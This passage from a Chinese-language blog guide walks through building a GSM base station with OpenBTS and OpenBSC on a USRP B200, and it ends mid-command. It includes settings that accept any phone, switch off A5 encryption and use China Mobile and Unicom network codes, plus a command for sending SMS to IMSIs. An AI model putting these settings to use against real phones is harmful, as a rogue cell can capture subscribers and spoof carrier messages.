href="#Install-libosmocore" class="headerlink" title="Install libosmocore"></a>Install libosmocore</h4><p>参考：<code>https://osmocom.org/projects/libosmocore/wiki/Libosmocore</code><br>这个比较坑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libtool libtalloc-dev shtool autoconf automake git-core pkg-config make gcc</span><br><span class="line">sudo apt-get install libpcsclite-dev</span><br></pre></td></tr></table></figure></p><p>这里直接./configure可能会报错，需要安装<code>libgnutls-dev</code>.apt install 即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone git://git.osmocom.org/libosmocore.git</span><br><span class="line">cd libosmocore/</span><br><span class="line">autoreconf -i</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig -i</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure></p><h4 id="Install-osmo-trx"><a href="#Install-osmo-trx" class="headerlink" title="Install osmo-trx"></a>Install osmo-trx</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/osmocom/osmo-trx</span><br><span class="line">cd osmo-trx</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>这里一定要通过源码编译安装，如果通过apt安装也会报错。<br>错误大概如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">terminate called after throwing an instance of &apos;std::bad_alloc&apos;</span><br><span class="line">  what():  std::bad_alloc</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure></p><h4 id="Install-osmo-nitb"><a href="#Install-osmo-nitb" class="headerlink" title="Install osmo-nitb"></a>Install osmo-nitb</h4><p>参考：<code>https://osmocom.org/projects/cellular-infrastructure/wiki/Nightly_Builds</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget --https-only https://download.opensuse.org/repositories/network:/osmocom:/nightly/xUbuntu_16.04/Release.key</span><br><span class="line">sha256sum Release.key</span><br><span class="line"># verify the SHA256 sum with the one on https://osmocom.org/projects/cellular-infrastructure/wiki/Nightly_Builds</span><br><span class="line">sudo apt-key add Release.key</span><br><span class="line">sudo su</span><br><span class="line">echo &quot;deb http://download.opensuse.org/repositories/network:/osmocom:/nightly/xUbuntu_16.04/ ./&quot; &gt; /etc/apt/sources.list.d/osmocom-nightly.list</span><br><span class="line">exit</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install osmocom-nitb osmo-bts-trx</span><br></pre></td></tr></table></figure></p><h2 id="OpenBTS"><a href="#OpenBTS" class="headerlink" title="OpenBTS"></a>OpenBTS</h2><p>安装到这里之后其实有两种选择，一种是OpenBTS,一种是OpenBSC。<br>OsmoTRX和OpenBTS是兼容的，可以实现语音和SMS服务，但是GPRS是不支持的。<br>理论上OsmoTRX支持osmoPCU和osmoBTS的GPRS功能。</p><h4 id="安装OpenBTS"><a href="#安装OpenBTS" class="headerlink" title="安装OpenBTS"></a>安装OpenBTS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir OpenBTS  //新建OpenBTS文件夹</span><br><span class="line">cd OpenBTS  //进入该文件夹</span><br><span class="line">git clone https://github.com/RangeNetworks/dev.git</span><br><span class="line">cd dev</span><br><span class="line">./clone.sh  //克隆代码</span><br><span class="line">./switchto.sh master  //切到master分支</span><br><span class="line">./build.sh B200   //构建USRP B200设备支持</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common python-software-properties</span><br><span class="line">sudo add-apt-repository ppa:chris-lea/zeromq</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>进入 <code>OpenBTS/dev/BUILDS/日期&#39;文件夹把所有deb都通过</code>sudo dpkg -i<code>安装有问题就用</code>sudo apt-get install -f`</p><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>启动osmo-trx,这里有一个问题，我的2.4G无线鼠标会跟USB3.0有干扰，导致会出现一些问题。<br><code>sudo osmo-trx-uhd -s 4 -c 1 -e -l INFO -f</code></p><ul><li><p>加载数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd dev/openbts/apps</span><br><span class="line">sudo sqlite3 -init OpenBTS.example.sql /etc/OpenBTS/OpenBTS.db &quot;.quit&quot;</span><br><span class="line"></span><br><span class="line">cd dev/subscriberRegistry/apps</span><br><span class="line">sudo sqlite3 -init sipauthserve.example.sql /etc/OpenBTS/sipauthserve.db &quot;.quit&quot;</span><br><span class="line"></span><br><span class="line">cd dev/smqueue/smqueue</span><br><span class="line">sudo sqlite3 -init smqueue.example.sql /etc/OpenBTS/smqueue.db &quot;.quit&quot;</span><br></pre></td></tr></table></figure></li><li><p>配置asterisk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">在/etc/asterisk/目录中需要修改sip.conf、extensions.conf 具体方法：将手机的IMSI国际用户识别码和分配的号码登记数据asterisk中，也就是将数据写入sip.conf、extensions.conf两个配置文件。</span><br><span class="line"></span><br><span class="line">SIP.CONF:</span><br><span class="line"></span><br><span class="line">[IMSI46001658*****19]</span><br><span class="line">callerid=2000003</span><br><span class="line">canreinvite=no</span><br><span class="line">type=friend</span><br><span class="line">allow=gsm</span><br><span class="line">context=sip-external</span><br><span class="line">host=dynamic</span><br><span class="line">dtmfmode=info</span><br><span class="line"></span><br><span class="line">[IMSI41004030*****62]</span><br><span class="line">callerid=2000004</span><br><span class="line">canreinvite=no</span><br><span class="line">type=friend</span><br><span class="line">allow=gsm</span><br><span class="line">context=sip-external</span><br><span class="line">host=dynamic</span><br><span class="line">dtmfmode=info</span><br><span class="line">callerid=2000003,表示将IMSI为46001658*****19的手机分配号码2000003；</span><br><span class="line"></span><br><span class="line">canreinvite=no，表示被呼叫的手机一旦建立连接后OpenBTS将不再发送重新邀请的指令；</span><br><span class="line"></span><br><span class="line">context=sip-external，表示允许外部未分配号码的匿名电话呼入。</span><br></pre></td></tr></table></figure></li><li><p>启动基站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd dev/openbts/apps/</span><br><span class="line">sudo ./OpenBTS</span><br></pre></td></tr></table></figure></li><li><p>启动短信服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd dev/smqueue/smqueue</span><br><span class="line">sudo ./smqueue</span><br></pre></td></tr></table></figure></li><li><p>启用鉴权服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd dev/subscriberRegistry/apps</span><br><span class="line">sudo ./sipauthserve</span><br></pre></td></tr></table></figure></li><li><p>asterisk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo asterisk -vvvc</span><br><span class="line">sudo asterisk -r</span><br></pre></td></tr></table></figure></li><li><p>允许任意机器接入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OpenBTS&gt; config Control.LUR.OpenRegistration .*</span><br><span class="line">Control.LUR.OpenRegistration changed from &quot;&quot; to &quot;.*&quot;</span><br></pre></td></tr></table></figure></li><li><p>设置天线功率</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OpenBTS&gt; devconfig GSM.Radio.RxGain 18</span><br><span class="line">GSM.Radio.RxGain changed from &quot;50&quot; to &quot;18&quot;</span><br><span class="line">GSM.Radio.RxGain is static; change takes effect on restart</span><br></pre></td></tr></table></figure></li><li><p>设置基站频段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OpenBTS&gt; config GSM.Radio.Band 900</span><br><span class="line">GSM.Radio.Band changed from &quot;850&quot; to &quot;900&quot;</span><br><span class="line">GSM.Radio.Band is static; change takes effect on restart</span><br></pre></td></tr></table></figure></li><li><p>设置欢迎短信</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config Control.LUR.NormalRegistration.Message Welcome to BTS 1</span><br></pre></td></tr></table></figure></li><li><p>其他</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">设置基站名：</span><br><span class="line">config GSM.Identity.ShortName GroundControl</span><br><span class="line">将基站设置为测试网络：</span><br><span class="line">config Identity config GSM.Identity.MCC 001</span><br><span class="line">将基站设置为国内： MCC460 为中国</span><br><span class="line">config GSM.Identity.MCC 460</span><br><span class="line">设置运营商为联 * 通：</span><br><span class="line">config GSM.Identity.MNC 01 </span><br><span class="line">设置运营商为移 * 动：</span><br><span class="line">config GSM.Identity.MNC 00 </span><br><span class="line">设置ARFCN、LAC、BCC</span><br><span class="line">网络色码，NCC，一般用于标识运营商；基站色码，BCC，区分同一运营商下的相同BCCH的不同基站。</span><br><span class="line"></span><br><span class="line">一般采用BCCH频点和BSIC来联合标识小区，BSIC=NCC+BCC。在TD和WCDMA里，存在PLMN，PLMN=MCC+MNC，其中MCC为移动国家码，MNC为移动网络码标识运营商。</span><br><span class="line"></span><br><span class="line">基站切换的时候,主要是通过CI、BCCHBSIC等信息寻找目标小区,当同时检测到邻区列表里出现同BCCH同扰码组的小区时,容易出现切换失败。</span><br><span class="line">OpenBTS&gt; config GSM.Radio.C0 168</span><br><span class="line">GSM.Radio.C0 changed from &quot;151&quot; to &quot;168&quot;</span><br><span class="line">GSM.Radio.C0 is static; change takes effect on restart</span><br><span class="line">OpenBTS&gt; config GSM.Identity.BSIC.BCC 3</span><br><span class="line">GSM.Identity.BSIC.BCC changed from &quot;2&quot; to &quot;3&quot;</span><br><span class="line">OpenBTS&gt; config GSM.Identity.LAC 1001</span><br><span class="line">GSM.Identity.LAC changed from &quot;1000&quot; to &quot;1001&quot;</span><br><span class="line">OpenBTS&gt; config GSM.Identity.CI 11</span><br><span class="line">GSM.Identity.CI changed from &quot;10&quot; to &quot;11&quot;</span><br></pre></td></tr></table></figure></li><li><p>查看已加入基站的设备<br><code>OpenBTS&gt; tmsis</code></p></li><li><p>发送短信<br><code>sendsms IMSI 号码 内容</code></p></li></ul><h2 id="OpenBSC"><a href="#OpenBSC" class="headerlink" title="OpenBSC"></a>OpenBSC</h2><p>然后看选择OpenBSC的折腾过程，首先可以先搞定通话和短信服务。<br>osmonitb在之前装好了，那么可以通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo osmo-trx-uhd -e # root needed for thread options set by the process</span><br><span class="line">osmo-nitb -c ./openbsc.cfg # change the path to your openbsc.cfg file</span><br><span class="line">osmo-bts-trx -c ./osmo-bts.cfg</span><br></pre></td></tr></table></figure></p><p>跑起来</p><p>需要改配置文件，我现在把成功的配置文件记录一下。<br>osmo-trx.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">log stderr</span><br><span class="line">  logging filter all 1</span><br><span class="line">  logging color 1</span><br><span class="line">  logging print category 1</span><br><span class="line">  logging timestamp 1</span><br><span class="line">  logging level all info</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">trx</span><br><span class="line"> bind-ip 127.0.0.1</span><br><span class="line"> remote-ip 127.0.0.1</span><br><span class="line"> base-port 5700</span><br><span class="line"> egprs disable</span><br><span class="line"> tx-sps 4</span><br><span class="line"> rx-sps 4</span><br><span class="line"> chan 0</span><br><span class="line">  tx-path BAND1</span><br><span class="line">  rx-path LNAW</span><br></pre></td></tr></table></figure></p><p>openbsc.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">! OpenBSC configuration saved from vty</span><br><span class="line">!   !</span><br><span class="line">password foo</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">e1_input</span><br><span class="line"> e1_line 0 driver ipa</span><br><span class="line">network</span><br><span class="line"> network country code 460</span><br><span class="line"> mobile network code 10</span><br><span class="line"> short name OpenBSC</span><br><span class="line"> long name OpenBSC</span><br><span class="line"> auth policy accept-all</span><br><span class="line"> location updating reject cause 13</span><br><span class="line"> encryption a5 0</span><br><span class="line"> neci 1</span><br><span class="line"> rrlp mode none</span><br><span class="line"> mm info 1</span><br><span class="line"> handover 0</span><br><span class="line"> handover window rxlev averaging 10</span><br><span class="line"> handover window rxqual averaging 1</span><br><span class="line"> handover window rxlev neighbor averaging 10</span><br><span class="line"> handover power budget interval 6</span><br><span class="line"> handover power budget hysteresis 3</span><br><span class="line"> handover maximum distance 9999</span><br><span class="line"> bts 0</span><br><span class="line">  type sysmobts</span><br><span class="line">  band GSM900</span><br><span class="line">  cell_identity 0</span><br><span class="line">  location_area_code 1</span><br><span class="line">  training_sequence_code 7</span><br><span class="line">  base_station_id_code 63</span><br><span class="line">  ms max power 15</span><br><span class="line">  cell reselection hysteresis 4</span><br><span class="line">  rxlev access min 0</span><br><span class="line">  channel allocator ascending</span><br><span class="line">  rach tx integer 9</span><br><span class="line">  rach max transmission 7</span><br><span class="line">  ip.access unit_id 1801 0</span><br><span class="line">  oml ip.access stream_id 255 line 0</span><br><span class="line">  gprs mode gprs</span><br><span class="line">  gprs routing area 0</span><br><span class="line">  gprs cell bvci 2</span><br><span class="line">  gprs nsei 101</span><br><span class="line">  gprs nsvc 0 nsvci 101</span><br><span class="line">  gprs nsvc 0 local udp port 23000</span><br><span class="line">  gprs nsvc 0 remote udp port 23000</span><br><span class="line">  gprs nsvc 0 remote ip 10.10.10.150</span><br><span class="line">  trx 0</span><br><span class="line">   rf_locked 0</span><br><span class="line">   arfcn 975</span><br><span class="line">   nominal power 23</span><br><span class="line">   max_power_red 20</span><br><span class="line">   rsl e1 tei 0</span><br><span class="line">   timeslot 0</span><br><span class="line">    phys_chan_config CCCH+SDCCH4</span><br><span class="line">   timeslot 1</span><br><span class="line">    phys_chan_config SDCCH8</span><br><span class="line">   timeslot 2</span><br><span class="line">    phys_chan_config TCH/F</span><br><span class="line">   timeslot 3</span><br><span class="line">    phys_chan_config TCH/F</span><br><span class="line">   timeslot 4</span><br><span class="line">    phys_chan_config TCH/F</span><br><span class="line">   timeslot 5</span><br><span class="line">    phys_chan_config TCH/F</span><br><span class="line">   timeslot 6</span><br><span class="line">    phys_chan_config TCH/F</span><br><span class="line">   timeslot 7</span><br><span class="line">    phys_chan_config TCH/F</span><br></pre></td></tr></table></figure></p><p>osmo-bts.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">! OsmoBTS configuration saved from vty</span><br><span class="line">!!</span><br><span class="line">!</span><br><span class="line">log stderr</span><br><span class="line">  logging filter all 1</span><br><span class="line">  logging color 1</span><br><span class="line">  logging print category 0</span><br><span class="line">  logging timestamp 0</span><br><span class="line">  logging level rsl notice</span><br><span class="line">  logging level rll notice</span><br><span class="line">  logging level rr notice</span><br><span class="line">  logging level meas error</span><br><span class="line">  logging level pag error</span><br><span class="line">  logging level l1c error</span><br><span class="line">  logging level l1p error</span><br><span class="line">  logging level dsp error</span><br><span class="line">  logging level pcu notice</span><br><span class="line">  logging level ho notice</span><br><span class="line">  logging level trx notice</span><br><span class="line">  logging level loop notice</span><br><span class="line">  logging level abis error</span><br><span class="line">  logging level rtp notice</span><br><span class="line">  logging level lglobal notice</span><br><span class="line">  logging level llapd notice</span><br><span class="line">  logging level lsms notice</span><br><span class="line">  logging level lctrl notice</span><br><span class="line">  logging level lstats notice</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">e1_input</span><br><span class="line"> e1_line 0 driver ipa</span><br><span class="line"> e1_line 0 port 0</span><br><span class="line"> no e1_line 0 keepalive</span><br><span class="line">phy 0</span><br><span class="line"> osmotrx ip 127.0.0.1</span><br><span class="line"> osmotrx fn-advance 20</span><br><span class="line"> osmotrx rts-advance 5</span><br><span class="line"> instance 0</span><br><span class="line">bts 0</span><br><span class="line"> band GSM900</span><br><span class="line"> ipa unit-id 1801 0</span><br><span class="line"> oml remote-ip 127.0.0.1</span><br><span class="line"> rtp jitter-buffer 100</span><br><span class="line"> paging queue-size 200</span><br><span class="line"> paging lifetime 0</span><br><span class="line"> uplink-power-target -75</span><br><span class="line"> gsmtap-sapi ccch</span><br><span class="line"> gsmtap-sapi pdtch</span><br><span class="line"> min-qual-rach 50</span><br><span class="line"> min-qual-norm -5</span><br><span class="line"> trx 0</span><br><span class="line">  power-ramp max-initial 23000 mdBm</span><br><span class="line">  power-ramp step-size 2000 mdB</span><br><span class="line">  power-ramp step-interval 1</span><br><span class="line">  ms-power-control dsp</span><br><span class="line">  phy 0 instance 0</span><br></pre></td></tr></table></figure></p><h2 id="OpenBSC-GPRS"><a href="#OpenBSC-GPRS" class="headerlink" title="OpenBSC GPRS"></a>OpenBSC GPRS</h2><p>参考：<br><code>https://osmocom.org/projects/cellular-infrastructure/wiki/OpenBSC_GPRS</code><br><code>https://github.com/cswiger/osmocom_cfg1</code></p><p>安装依赖<br><code>apt install libdbi0-dev libdbd-sqlite3 libtool autoconf git-core pkg-config make libortp-dev</code></p><p>需要安装<br>openggsn<br>libosmocore<br>libosmo-abis<br>libosmo-netif<br>openbsc<br>osmo-pcu</p><h4 id="completely-build-osmo-bsc-osmo-msc-osmo-sgsn-and-osmo-ggsn"><a href="#completely-build-osmo-bsc-osmo-msc-osmo-sgsn-and-osmo-ggsn" class="headerlink" title="completely build osmo-bsc, osmo-msc, osmo-sgsn and osmo-ggsn"></a>completely build osmo-bsc, osmo-msc, osmo-sgsn and osmo-ggsn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/libosmocore</span><br><span class="line">cd libosmocore</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/libosmo-abis</span><br><span class="line">cd libosmo-abis</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/libosmo-netif</span><br><span class="line">cd libosmo-netif</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/libosmo-sccp</span><br><span class="line">cd libosmo-sccp</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/libsmpp34</span><br><span class="line">cd libsmpp34</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/osmo-mgw</span><br><span class="line">cd osmo-mgw</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/libasn1c</span><br><span class="line">cd libasn1c</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/osmo-iuh</span><br><span class="line">cd osmo-iuh</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/osmo-msc</span><br><span class="line">cd osmo-msc</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure --enable-iu</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd $osmo_src</span><br><span class="line">git clone git://git.osmocom.org/osmo-ggsn</span><br><span class="line">cd osmo-ggsn</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd 